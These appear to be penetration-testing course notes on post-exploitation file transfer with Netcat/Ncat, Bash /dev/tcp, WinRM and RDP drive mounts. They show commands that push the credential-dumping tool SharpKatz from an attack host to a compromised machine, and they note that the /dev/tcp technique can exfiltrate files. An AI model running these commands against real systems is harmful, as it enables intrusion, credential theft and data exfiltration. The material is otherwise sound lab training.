## Miscellaneous File Transfer Methods

So far, we have covered multiple ways to transfer files on Windows and Linux systems, including approaches using common programming languages. There are, however, many additional techniques that can be useful when standard methods are blocked or restricted.

This section focuses on alternative file transfer methods using **Netcat/Ncat**, **PowerShell Remoting**, and **RDP**.

---

## Netcat and Ncat

**Netcat (nc)** is a networking utility that can read from and write to network connections using TCP or UDP, making it suitable for file transfer operations.

* Original Netcat was released in 1995 and is no longer maintained.
* **Ncat**, developed by the Nmap Project, is a modern replacement that supports SSL, IPv6, proxies, and improved connection handling.

> **Note:**
> On Hack The Box PwnBox, Ncat is available as `nc`, `ncat`, and `netcat`.

---

## File Transfer with Netcat / Ncat

Either the attacking machine or the target can initiate the connection. This flexibility is useful when firewalls restrict inbound or outbound traffic.

### Scenario Example

Transfer `SharpKatz.exe` from the attack host (PwnBox) to a compromised target.

---

### Method 1: Target Listens, Attacker Sends

#### Compromised Machine (Listening)

**Using original Netcat**

```bash
nc -l -p 8000 > SharpKatz.exe
```

**Using Ncat**

```bash
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

The `--recv-only` option ensures the connection closes automatically once the transfer completes.

#### Attack Host (Sending)

Download the file first:

```bash
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
```

**Using original Netcat**

```bash
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

**Using Ncat**

```bash
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

* `-q 0` and `--send-only` ensure the connection terminates after sending the file.

---

### Method 2: Attacker Listens, Target Connects

This is useful when inbound connections to the target are blocked.

#### Attack Host (Listening)

**Using original Netcat**

```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

**Using Ncat**

```bash
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine (Receiving)

**Using original Netcat**

```bash
nc 192.168.49.128 443 > SharpKatz.exe
```

**Using Ncat**

```bash
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

---

### File Transfer Using `/dev/tcp` (No Netcat Required)

If Netcat or Ncat is not available, Bash supports TCP read/write via `/dev/tcp`.

#### Attack Host (Listening)

```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Compromised Machine (Receiving)

```bash
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

> **Note:**
> The same technique can be used to exfiltrate files from the compromised host.

---

## PowerShell Remoting (WinRM)

When HTTP, HTTPS, or SMB are unavailable, **PowerShell Remoting (WinRM)** can be used for file transfers.

* Default ports:

  * TCP 5985 (HTTP)
  * TCP 5986 (HTTPS)
* Requires administrative privileges or explicit WinRM permissions.

---

### Verifying WinRM Connectivity

From `DC01`, confirm connectivity to `DATABASE01`:

```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

---

### Creating a PowerShell Remoting Session

```powershell
$Session = New-PSSession -ComputerName DATABASE01
```

---

### Copying Files with PowerShell Remoting

**Local → Remote**

```powershell
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

**Remote → Local**

```powershell
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

---

## RDP File Transfers

**Remote Desktop Protocol (RDP)** also supports file transfer functionality.

### Methods

* Copy and paste between local and remote systems.
* Mount a local directory into the RDP session.

---

### Mounting a Local Folder (Linux → Windows)

**Using rdesktop**

```bash
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

**Using xfreerdp**

```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

Mounted drives are accessible via:

```
\\tsclient\
```

> **Note:**
> Mounted drives are only accessible to the current RDP session user.

![tsclient](https://github.com/user-attachments/assets/3e051b86-40f1-4e2a-a951-f6b693c0de3c)

<img width="1155" height="822" alt="rdp" src="https://github.com/user-attachments/assets/89aa5848-e8df-4021-8fc2-0b8c114ec94a" />
